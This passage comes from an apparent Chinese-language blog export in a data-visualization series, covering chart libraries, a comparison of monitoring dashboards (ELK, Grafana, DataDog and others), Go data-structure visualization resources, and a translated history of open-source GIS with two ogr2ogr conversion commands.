<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Navy    — #001f3f</span><br><span class="line">Blue    — #0074d9</span><br><span class="line">Aqua    — #7fdbff</span><br><span class="line">Teal    — #39cccc</span><br><span class="line">Olive   — #3d9970</span><br><span class="line">Green   — #2ecc40</span><br><span class="line">Lime    — #01ff70</span><br><span class="line">Yellow  — #ffdc00</span><br><span class="line">Orange  — #ff851b</span><br><span class="line">Red     — #ff4136</span><br><span class="line">Maroon  — #85144b</span><br><span class="line">Fuchsia — #f012be</span><br><span class="line">Purple  — #b10dc9</span><br><span class="line">Black   — #<span class="number">111111</span></span><br><span class="line">Gray    — #aaaaaa</span><br><span class="line">Silver  — #dddddd</span><br><span class="line">White   — #ffffff</span><br></pre></td></tr></table></figure>
<ul>
<li><p>优化图表JS生成模板<br>图表定型之后，可以通过模板固化配置，根据需要动态生成目标文件（html,js,svg等等），详见<a href="https://riboseyim.github.io/2017/12/21/Language-Auto-Generator/">基于 Markdown 的 HTML 网页模板</a>。</p>
</li>
<li><p>优化采集器 Goroutines “线程池”<br>例如：PostgreSQL Exception: Open too many files</p>
</li>
<li><p>优化数据存储<br>例如：常用的 GIS 坐标库</p>
</li>
</ul>
<h2 id="扩展阅读：开源工具与案例"><a href="#扩展阅读：开源工具与案例" class="headerlink" title="扩展阅读：开源工具与案例"></a>扩展阅读：开源工具与案例</h2><h4 id="在线词云"><a href="#在线词云" class="headerlink" title="在线词云"></a>在线词云</h4><ul>
<li><a href="http://www.wordart.com">WordArt.com</a>:仅支持英文，精美，首选</li>
<li><a href="http://www.tagxedo.com/app.html">Tagxedo</a>:支持中、英文（中文分词效果一般），需要安装插件Silverlight</li>
<li><a href="https://mp.weixin.qq.com/s/USIakoaavuy7XkO-5C0tgA">Tag Crowd &amp; Google Adwords</a></li>
</ul>
<h4 id="golang-based-library"><a href="#golang-based-library" class="headerlink" title="golang-based library"></a>golang-based library</h4><ul>
<li><a href="https://golang.org/pkg/net/http/">golang.org/net/http</a></li>
<li><a href="https://github.com/celrenheit/spider">github.com/celrenheit/spider</a></li>
<li><a href="https://www.progville.com/go/goquery-jquery-html-golang/">goquery: jQuery-style HTML manipulation in Go</a></li>
<li><a href="https://github.com/henrylee2cn/pholcus_lib">github.com/henrylee2cn/pholcus_lib</a></li>
<li><a href="https://github.com/henrylee2cn/pholcus">Pholcus is a distributed, high concurrency and powerful web crawler software</a></li>
</ul>
<h4 id="可视化图表案例"><a href="#可视化图表案例" class="headerlink" title="可视化图表案例"></a>可视化图表案例</h4><ul>
<li><a href="http://echarts.baidu.com/doc/example/topic/aqi-china/index.html">中国主要城市空气质量实况</a></li>
<li><a href="http://echarts.baidu.com/doc/example/topic/10-me-china/index.html">中国经济十年时空漫游（2002-2011）</a></li>
</ul>
<h2 id="可视化图表技术方案"><a href="#可视化图表技术方案" class="headerlink" title="可视化图表技术方案"></a>可视化图表技术方案</h2><ul>
<li>基于 SVG : D3、Raphael</li>
<li><p>基于 Canvas : Echarts</p>
</li>
<li><p><a href="http://www.highcharts.com">HighCharts</a><br>国外开源产品，JavaScript 编写，自带主题、动态交互方便，目前公司新版业务视图、地图应用、交互式流量图等是基于这个库实现。<br>不足：缺少中文文档，开源许可证只允许个人用户和非商业用途，规模应用存在法律风险。</p>
</li>
<li><p><a href="http://echarts.baidu.com">Baidu ECharts</a><br>最早源于百度各种业务系统报表需求，底层画图基于 Canvas 。2013年开源，完全免费的BSD协议。<br>特点：拖拽重计算，第三方标准格式支持，中文社区支持<br>实例：<a href="http://echarts.baidu.com/doc/example.html">http://echarts.baidu.com/doc/example.html</a><br>Github: <a href="https://github.com/ecomfe/echarts">https://github.com/ecomfe/echarts</a><br><img src="http://riboseyim-qiniu.riboseyim.com/echarts-%E5%9B%BD%E5%AE%B6%E7%BB%9F%E8%AE%A1%E5%B1%80.png" alt=""></p>
</li>
<li><p><a href="http://www.oschina.net/p/kartograph?fromerr=tZ15BKGv">Kartograph</a><br>Kartograph 是个构建交互式地图的简单、轻量级类库。它包含两个库，一个用Python写的，用于产生漂亮和压缩的SVG地图，另一个是js类库用于前端展示地图用。</p>
</li>
<li><p><a href="https://github.com/ajstarks/deck/tree/master/cmd/lchart">lchart(go-based)</a></p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s/FXeDOHg_k52nv4We08SeQQ">朝花夕拾|showtext：字体，好玩的字体和好玩的图形 | 原创 2016-11-06 统计之都 统计之都</a></p>
</li>
<li><p><a href="https://github.com/cttobin/ggthemr">Themes for ggplot2.</a></p>
</li>
</ul>
<h2 id="扩展阅读：数据可视化"><a href="#扩展阅读：数据可视化" class="headerlink" title="扩展阅读：数据可视化"></a>扩展阅读：数据可视化</h2><ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-BestAppMap">数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测</a></li>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-GIS/">数据可视化（四）开源地理信息技术简史（Geographic Information System</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="https://riboseyim.com/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.com/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
<li><a href="https://riboseyim.com/2018/01/15/Visualization-DataSource/">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/t668acG5lRZxZ7A0xMXTSg">数据从业者必读：抓取了一千亿个网页后我才明白，爬虫一点都不简单 | 算法与数学之美  2018-09-07</a></li>
<li><a href="https://mp.weixin.qq.com/s/dw-c-nV8TJK5WWzSPal-yA">Matplotlib 可视化最有价值的 14 个图表（附完整 Python 源代码） | Lemonbit  GitChat精品课  3月13日</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>数据可视化</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>数据可视化（六）常见的可视化仪表盘(DashBoard)</title>
    <url>/2017/11/23/Visualization-DashBoard/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>仪表盘（DashBoard）</li>
<li>决策路径 (Decision Path)</li>
<li>ELK Stack（Elasticsearch、Logtash、Kibana）</li>
<li>Graphite &amp; Grafana</li>
<li>Keen IO 、Librato、DataDog</li>
</ul>
<span id="more"></span>
<h4 id="仪表盘（DashBoard）"><a href="#仪表盘（DashBoard）" class="headerlink" title="仪表盘（DashBoard）"></a>仪表盘（DashBoard）</h4><ul>
<li>指标工具 (Metrics Tools)</li>
<li>可视化工具 (Visualization Tools)</li>
<li>日志管理工具 (Log Management tools)</li>
</ul>
<h4 id="决策路径-Decision-Path"><a href="#决策路径-Decision-Path" class="headerlink" title="决策路径 (Decision Path)"></a>决策路径 (Decision Path)</h4><ol>
<li>OpenSource or SaaS ?</li>
</ol>
<ul>
<li>开源软件：需要自己安装和配置 ( Graphite and ELK stack )</li>
<li>SaaS：需要改造现有程序、嵌入代码 ( Keen IO, Librato, and DataDog)</li>
</ul>
<ol>
<li><p>Analytics or Visualization<br>复杂分析: Keen IO 、 ELK stack<br>监控/指标呈现：Graphite（Grafana）、 DataDog</p>
</li>
<li><p>Budget and Environment</p>
</li>
</ol>
<ul>
<li>迁移成本：例如现有资产中已经有 Graphite 数据，采用Grafana可即时提升数据可视化效果</li>
<li>成本预算：例如日志分析器（log analyzer）的带宽和存储</li>
</ul>
<h2 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h2><ul>
<li>ELK Stack （Elasticsearch、Logtash、Kibana）</li>
<li>Graphite &amp; Grafana : <a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">基于数据分析的网络态势感知</a></li>
<li>Keen IO</li>
<li>Librato</li>
<li>DataDog</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>选项</th>
<th>价格</th>
<th>优点</th>
<th>弱点</th>
</tr>
</thead>
<tbody>
<tr>
<td>ELK Stack</td>
<td>免费（Elastic paid plans 提供不同级别的专家服务）</td>
<td>Strong Communities;Kibana 包含商业分析；ES 与 Kibana 易集成</td>
<td>安装配置；大规模使用时的机器成本</td>
</tr>
<tr>
<td>Graphite</td>
<td>免费</td>
<td>real-time graphs of numeric and time-differentiated data</td>
<td>数据采集和复杂分析能力弱；</td>
</tr>
<tr>
<td>Grafana</td>
<td>免费</td>
<td>支持多种数据源，提供丰富的插件</td>
<td>不提供数据存储，不提供数据采集</td>
</tr>
<tr>
<td>Keen IO</td>
<td>Free to $2000/月，按量收费</td>
<td>实时/归档数据可视化能力强；易于共享和提取数据</td>
<td>需要嵌入代码，依赖和拓展管理难度</td>
</tr>
<tr>
<td>Librato</td>
<td>按指标收费</td>
<td>监测和管理云应用，提供可以高度定制化的报表及告警功能</td>
<td>计费复杂，不提供数据采集，需要嵌入代码，依赖和拓展管理难度</td>
</tr>
<tr>
<td>DataDog</td>
<td>免费版，标准版（主机数量，$15台/月）</td>
<td>app、软硬件数据统一</td>
<td>目前不发展数据分析</td>
</tr>
</tbody>
</table>
</div>
<h4 id="ELK-Stack"><a href="#ELK-Stack" class="headerlink" title="ELK Stack"></a>ELK Stack</h4><p>Elasticsearch: 搜索和分析能力<br>Logstash: 日志聚合器(Aggregator)<br>Kibana：DashBoard</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DashBoards_ELK_Kibana.jpg" alt=""></p>
<h4 id="Graphite-amp-Grafana"><a href="#Graphite-amp-Grafana" class="headerlink" title="Graphite &amp; Grafana"></a>Graphite &amp; Grafana</h4><ul>
<li><a href="https://riboseyim.github.io/2017/12/04/Visualization-Graphite/">Graphite</a>: 开发语言（Python），支持数据存储、图形化和可视化，本身并不收集数据，需要和采集工具配合。</li>
<li>Grafana: 开发语言（Go），提供了一个指标集的仪表盘，<strong>可以将 Graphite 作为数据源（DataSource）</strong>。</li>
</ul>
<blockquote>
<p>Grafana provides many additional features and spiffy looking visuals to Graphite</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DashBoards_Grafana.jpg" alt=""></p>
<h4 id="Keen-IO"><a href="#Keen-IO" class="headerlink" title="Keen IO"></a>Keen IO</h4><p>Keen IO is a <strong>SaaS</strong> analytics infrastructure platform.<br><img src="http://riboseyim-qiniu.riboseyim.com/DashBoards_Keenio.jpg" alt=""></p>
<h4 id="Librato"><a href="#Librato" class="headerlink" title="Librato"></a>Librato</h4><p>监测和管理云应用；<br>提供可以高度定制化的报表；<br>提供多样化的告警通知方式：邮件、HipChat、Campfire、HTTP Post</p>
<h4 id="DataDog"><a href="#DataDog" class="headerlink" title="DataDog"></a>DataDog</h4><p>DataDog is SaaS monitoring tool.<br>DataDog 主要围绕数据聚集和呈现，并不关注数据分析，即强调所有硬件、软件产生的数据实现汇聚统一。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DashBoards_DataDog.jpg" alt=""></p>
<h2 id="扩展阅读：数据可视化"><a href="#扩展阅读：数据可视化" class="headerlink" title="扩展阅读：数据可视化"></a>扩展阅读：数据可视化</h2><ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-BestAppMap">数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测</a></li>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-GIS/">数据可视化（四）开源地理信息技术简史（Geographic Information System</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="https://riboseyim.com/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.com/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
<li><a href="https://riboseyim.com/2018/01/15/Visualization-DataSource/">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://blog.takipi.com/production-tools-guide/visualization-and-metrics/"></a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>数据可视化</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>数据可视化（九）探索数据结构之美</title>
    <url>/2018/12/23/Visualization-DataStruct/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<blockquote>
<p>在建筑中没有固定不变的定律，但也不是一切都能在一栋建筑或一座城市中通行无阻。建筑师的主要职责在于仔细衡量得失，作出决定。<br>他必须决定什么可行，什么有可能妥协，什么可以放弃，在何处和怎样做。他并不忽视或排斥设计要求和结构在法则中的矛盾。<br>———— 罗伯特·文丘里《建筑的复杂性与矛盾性》p69</p>
</blockquote>
<p>This article is part of an <strong>Data Visualization</strong> tutorial series. Make sure to check out my other articles as well:</p>
<ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
</ul>
<h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ul>
<li><a href="https://github.com/Arafatk/DataViz" target="_blank" rel="noopener">Project DataViz</a>:Build and Visualize data structures in Golang</li>
<li><a href="https://github.com/bradleyjkemp/memviz" target="_blank" rel="noopener">Project memviz</a>:Visualize your data structures using graphviz</li>
<li><p><a href="https://github.com/emirpasic/gods/tree/master/examples" target="_blank" rel="noopener">Project GoDS (Go Data Structures)</a><br>GoDS (Go Data Structures). Containers (Sets, Lists, Stacks, Maps, Trees), Sets (HashSet, TreeSet, LinkedHashSet), Lists (ArrayList, SinglyLinkedList, DoublyLinkedList), Stacks (LinkedListStack, ArrayStack), Maps (HashMap, TreeMap, HashBidiMap, TreeBidiMap, LinkedHashMap), Trees (RedBlackTree, AVLTree, BTree, BinaryHeap), Comparators, Iterators, …</p>
</li>
<li><p><a href="https://medium.com/@Arafat./introducing-glot-the-plotting-library-for-golang-3133399948a1" target="_blank" rel="noopener">Introducing Glot the plotting library for Golang</a></p>
</li>
<li><a href="https://medium.com/basecs/painting-nodes-black-with-red-black-trees-60eacb2be9a5" target="_blank" rel="noopener">Painting Nodes Black With Red-Black Trees</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://blog.csdn.net/chouisbo/article/details/54969264" target="_blank" rel="noopener">Binary Heap(二叉堆)</a></li>
<li><a href="https://blog.csdn.net/v_JULY_v/article/details/6105630" target="_blank" rel="noopener">初步了解红黑树</a></li>
<li><a href="https://blog.csdn.net/v_JULY_v/article/details/6531399" target="_blank" rel="noopener">从2-3-4树谈到Red-Black Tree（红黑树）</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>数据可视化</tag>
        <tag>Developer</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title>数据可视化（四）开源地理信息系统简史</title>
    <url>/2017/05/12/Visualization-GIS/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>开源 GIS 技术简史</li>
<li>1.1、GIS 的起源: MOSS and GRASS</li>
<li>1.2、GIS 的发展：GeoTools, GDAL, PostGIS 和 GeoServer</li>
<li>1.3、创新和教育：开源项目驱动</li>
<li>1.4、开源 GIS 的商业支持</li>
<li>Demo:A Full Stack Geo-enabled Internet of Things (IoT) Solution</li>
</ul>
<span id="more"></span>
<h2 id="一、开源-GIS-技术简史：从渺小到改变世界"><a href="#一、开源-GIS-技术简史：从渺小到改变世界" class="headerlink" title="一、开源 GIS 技术简史：从渺小到改变世界"></a>一、开源 GIS 技术简史：从渺小到改变世界</h2><ul>
<li><a href="https://thenewstack.io/humble-beginnings-world-changing-applications-history-open-source-gis/">原文: A History of Open Source GIS, from Humble Beginnings to World-Changing Applications | 23 Jun 2017 9:00am, by Anthony Calamito</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/GIS_History_1.jpg" alt=""></p>
<p>数字制图和地理空间信息系统（Geographic Information System,GIS）的出现彻底改变了人们和对周围世界思考、互动的方式。将位置信息分层重叠用于决策的概念首先是由 Ian McHarg（景观设计师）在上世纪60年代提出。大约在同一时间，Roger Tomlinson —— 人们普遍称之为“GIS 之父”（Father of GIS） 完成了他的博士论文，主要研究使用计算方法处理分层的地理空间信息。罗杰随后致力于创建第一个计算机化的地理信息系统——加拿大地理信息系统（the Canada Geographic Information System），主要用于勘探测绘。</p>
<p>开源 GIS 的起源可以追溯到 1978 年的美国内政部（U.S. Department of the Interior）。从那时起，开源 GIS 基于不同的知识产权许可证，深入影响到许多行业的发展，包括政府和商业领域。美国劳工部称 GIS 技术为二十一世纪最重要的三大高增长产业之一。开源 GIS 技术在过去四十年的发展，直到今天演变出许多具有开创性和影响力的应用。</p>
<h4 id="1-1、GIS-的起源-MOSS-and-GRASS"><a href="#1-1、GIS-的起源-MOSS-and-GRASS" class="headerlink" title="1.1、GIS 的起源: MOSS and GRASS"></a>1.1、GIS 的起源: MOSS and GRASS</h4><p>1978年，美国内政部创建了 MOSS 系统（the Map Overlay and Statistical System ，地图叠加和统计系统）。MOSS 系统主要用于跟踪和评估矿山开发对环境、野生植物、野生动物及其迁徙方式的影响。这是第一个广泛部署，基于矢量（Vector Based）、可互动的地理信息系统。第一套 GIS 生产部署在小型机上。</p>
<p>随后不久，GRASS (“草” ，Geographic Resources Analysis Support System，地理资源分析支持系统）诞生。GRASS 系统拥有 350 多个模块用于处理栅格、拓扑向量、图像和图形数据，该软件最初设计提供给美国军方使用，以协助土地管理和环境规划。GRASS 系统广泛应用于科学研究和商业领域，包括地理空间数据管理和分析、图像处理、空间和时间建模以及创建图形和地图。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/GIS_History_2.png" alt=""></p>
<h4 id="1-2、GIS-的发展：GeoTools-GDAL-PostGIS-和-GeoServer"><a href="#1-2、GIS-的发展：GeoTools-GDAL-PostGIS-和-GeoServer" class="headerlink" title="1.2、GIS 的发展：GeoTools, GDAL, PostGIS 和 GeoServer"></a>1.2、GIS 的发展：GeoTools, GDAL, PostGIS 和 GeoServer</h4><p>1996，利兹大学（the University of Leeds）在一个项目上开始创建基于 Java 开发语言的地理信息库，设计可以被纳入不同的应用需要。最终的成果是 GeoTools，一个可以操纵空间数据的开源库，在今天广泛应用于Web地理空间信息服务，网络地图服务和桌面应用程序。<br><img src="http://riboseyim-qiniu.riboseyim.com/GIS_History_3.gif" alt=""></p>
<p>四年后，一个跨平台的地理信息库 GDAL (Geospatial Data Abstraction Library, 地理空间数据抽象库) 出现了 。GDAL 使得 GIS 应用程序可以支持不同的数据格式，它还附带了各种有用的命令行工具，用于处理和转换各种数据格式。GDAL 支持超过 50 个栅格格式和20 个矢量格式的数据，它是全世界使用最广泛的地理空间数据访问库，支持的应用程序包括谷歌地球（Google Earth），GRASS，QGIS、FME（the Feature Manipulation Engine）和ArcGIS。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/GIS_History_4.png" alt=""></p>
<p>2001年，<a href="http://www.refractions.net">Refractions Research(加拿大 IT 咨询机构，创建于1998年)</a>， 研发了开源项目 PostGIS ，使得空间数据可以存储在 Postgres 数据库。同年，GeoServer 创建，一个基于 Java 语言开发的应用程序，用于将空间数据发布为标准的Web服务。PostGIS 和 GeoServer 项目都取得了令人难以置信的成功，今天广泛应用于开源 GIS 数据库和 GIS 服务器。</p>
<h4 id="1-3、创新和教育：开源项目驱动"><a href="#1-3、创新和教育：开源项目驱动" class="headerlink" title="1.3、创新和教育：开源项目驱动"></a>1.3、创新和教育：开源项目驱动</h4><p>QGIS 被认为是在开源桌面 GIS 的鼻祖。QGIS 在2002发布，它集成了GRASS 系统的分析功能，以及 GDAL 对于数据格式支持，提供一个用户友好的桌面应用程序进行数据编辑、地图制图与分析。QGIS 可以和其他开源 GIS 互相操作，例如；管理 PostGIS 数据库，将数据发布到 GeoServer 作为 Web 服务。</p>
<p>在21世纪初，开源GIS 继续获得发展动力， 创建的开源孵化项目是 OSGeo 和 LocationTech。OSGeo 在 2006 年被推出，设计目标是支持开源 GIS 软件的协同开发，以及促进相关软件的广泛应用。LocationTech 是在 Eclipse 基金会(the Eclipse Foundation ) 中设立的一个工作组，旨在促进 GIS 技术在学术研究者，产业和社区之间的合作。</p>
<p>2011 年，“Geo for All” 创建。他是是<a href="http://www.osgeo.org/">开源地理空间基金会（Open Source Geospatial Foundation）</a>的教育推广项目，目的是使人人都能接触到地理空间技术教育的机会。作为该基金会的工作成果，许多开源 GIS 的教育资源能在互联网上免费提供，包括 FOSS4G Academy 和 GeoAcademy。最后，“Geo for All” 致力于在世界各地建立了开源地理空间实验室和研究中心，以支持开源的地理空间技术开发、培训和研究。</p>
<h4 id="1-4、开源-GIS-的商业支持"><a href="#1-4、开源-GIS-的商业支持" class="headerlink" title="1.4、开源 GIS 的商业支持"></a>1.4、开源 GIS 的商业支持</h4><p>在2013年，我工作的 <a href="https://boundlessgeo.com">Boundless 公司</a>，成为第一家提供世界上最流行开源 GIS 应用软件的公司，包括数据库、服务器、桌面、网络、移动和云级别的商业支持和维护。Boundless 的产品套件确保了大型组织利用开源 GIS 技术的时候获得成功所需要的充分技术支持。该公司为最流行的开源 GIS 软件提供持续升级和补丁更新。</p>
<h4 id="1-5、The-Future-and-Beyond"><a href="#1-5、The-Future-and-Beyond" class="headerlink" title="1.5、The Future and Beyond"></a>1.5、The Future and Beyond</h4><p>目前，现代计算的挑战要求将软件部署在云平台工作，并支持创建大量数据所带来的需求。两种开源 GIS 软件解决方案可以满足这些挑战，包括 <a href="http://www.geomesa.org/">GeoMesa，一个开源的分布式时空数据库</a>，<a href="https://geotrellis.io/">GeoTrellis，一个支持高性能应用的地理数据处理引擎</a>。</p>
<p>这两种解决方案在2014中引入，可以处理云中的地理空间大数据。由于它们是建立在开源框架之上的，用户不需要商业软件许可证就可以使用而不必担心受到惩罚，而且可以按照用户需要进行弹性扩展。</p>
<p>开源 GIS 拥有美好的前景和巨大的潜力，它使得增强协作、共享有价值的数据和访问关键资源成为可能。凭借其众多的环境、政府、公共安全和健康应用，开源GIS 技术及其应用项目具有改变世界的潜力。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/GIS-History-5.png" alt=""></p>
<h4 id="Demo-A-Full-Stack-Geo-enabled-Internet-of-Things-IoT-Solution"><a href="#Demo-A-Full-Stack-Geo-enabled-Internet-of-Things-IoT-Solution" class="headerlink" title="Demo:A Full Stack Geo-enabled Internet of Things (IoT) Solution"></a>Demo:A Full Stack Geo-enabled Internet of Things (IoT) Solution</h4><ul>
<li>Github:<a href="https://github.com/amollenkopf/dcos-iot-demo">https://github.com/amollenkopf/dcos-iot-demo</a></li>
<li>using Mesosphere’s open sourced Data Center Operating System (DC/OS)</li>
<li>using Docker containerization and frameworks for Mesos including Marathon, Kafka, Spark, and Elasticsearch.<br><img src="http://riboseyim-qiniu.riboseyim.com/GIS_History_Demo_Mesosphere_DCOS_Architecture.jpg" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/GIS_History_Demo_Mesosphere.png" alt=""></li>
</ul>
<h2 id="二、GIS-Technology-Applications"><a href="#二、GIS-Technology-Applications" class="headerlink" title="二、GIS Technology Applications"></a>二、GIS Technology Applications</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ogr2ogr -f GeoJSON -where &quot;NAME_1=&#x27;CHINA&#x27;&quot;       CHM_geo.json         CHN_adm1.shp   </span><br><span class="line">ogr2ogr -f GeoJSON -where &quot;NAME_1=&#x27;Guangdong&#x27;&quot;   Guangdong2_geo.json  CHN_adm2.shp</span><br></pre></td></tr></table></figure>
<ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NDQ3NTkwMA==&amp;mid=2650141909&amp;idx=1&amp;sn=71c1bd26d54df9fe1737c0e80a954a55&amp;chksm=be866ec689f1e7d08c420cdfe746562168167b444df320319d443174aa3514b368810cc87a8e&amp;mpshare=1&amp;scene=1&amp;srcid=0224I7JQUudvP0PPn5XPamTt#rd">十行代码看到空气质量指数(leafletCN/geojsonMap)</a></li>
</ul>
<h2 id="Projects"><a href="#Projects" class="headerlink" title="Projects"></a>Projects</h2><ul>
<li><a href="https://eng.uber.com/rethinking-gps/">Rethinking GPS: Engineering Next-Gen Location at Uber</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h4><ul>
<li><p><a href="https://legacy.lib.utexas.edu/maps/ams/china/">图书馆|德克萨斯州大学奥斯汀分校 University of Texas at Austin|美军标准中国地图 China AMS Topographic Maps</a></p>
</li>
<li><p><a href="http://legacy.lib.utexas.edu/maps/ams/china/txu-oclc-10552568-nf49-4.jpg">美军军用地图|中国·广州|1950 年 1：250，000 比例尺</a></p>
</li>
<li><p><a href="http://www.doi.gov/">美国内政部 | U.S. Department of the Interior</a><br>美国内政部（United States Department of the Interior，缩写：DOI）与大多数国家的内政部负责警察或安全事务不同，负责管理美国联邦政府拥有的土地、开采和保护美国的自然资源，并负责有关阿拉斯加、夏威夷原住民和美国岛屿地区领土事务。下辖美国地质调查局、国家公园管理局、土地管理局等机构。</p>
</li>
<li><p><a href="https://www.usgs.gov/">美国地质调查局 | U.S. Geological Survey</a><br>美国地质调查局（United States Geological Survey，缩写：USGS）是美国内政部辖下的科学机构，是内政部唯一一个纯粹的科学部门，有约一万名人员，总部设在弗吉尼亚州雷斯敦。美国地质调查局的科学家主要研究美国的地形、自然资源和自然灾害与其的应付方法；负责四大科学范畴：生物学、地理学、地质学和水文学。</p>
</li>
<li><strong>美国地质调查局是美国的主要公共地图制作机构</strong>，制作线上的美国地图，又与商业公司合作向公众销售地图；</li>
<li>负责全球地震监测（美国地震资讯中心，科罗拉多），负责管理地震监测系统、地磁监测系统（公布磁场和实时磁力表）；</li>
<li>参与地球、月球和行星的探测和地图制作（从1962年开始）；</li>
<li>负责国家野生动植物健康中心：野生动物、植物和生态系统；在国内运行17个生物研究中心；</li>
<li><p>负责国家火山早期预警中心（2005年）：改善美国国内的169座火山的监测，研究新的监测方法。</p>
</li>
<li><p><a href="http://www.refractions.net">Refractions Research(加拿大 IT 咨询机构，创建于1998年)</a></p>
</li>
<li><a href="http://www.osgeo.org/">开源地理空间基金会（Open Source Geospatial Foundation）</a></li>
<li><a href="http://www.osgeo.cn/map">OSGeo 中国中心 | 在线地图资源库 </a></li>
<li><a href="http://www.geomesa.org/">GeoMesa，一个开源的分布式时空数据库</a></li>
<li><a href="https://geotrellis.io/">GeoTrellis，一个支持高性能应用的地理数据处理引擎</a></li>
</ul>
<h4 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h4><ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-BestAppMap">数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测</a></li>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-GIS/">数据可视化（四）开源地理信息技术简史（Geographic Information System</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="https://riboseyim.com/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.com/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
<li><a href="https://riboseyim.com/2018/01/15/Visualization-DataSource/">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://thenewstack.io/humble-beginnings-world-changing-applications-history-open-source-gis/">A History of Open Source GIS, from Humble Beginnings to World-Changing Applications | 23 Jun 2017 9:00am, by Anthony Calamito</a></li>
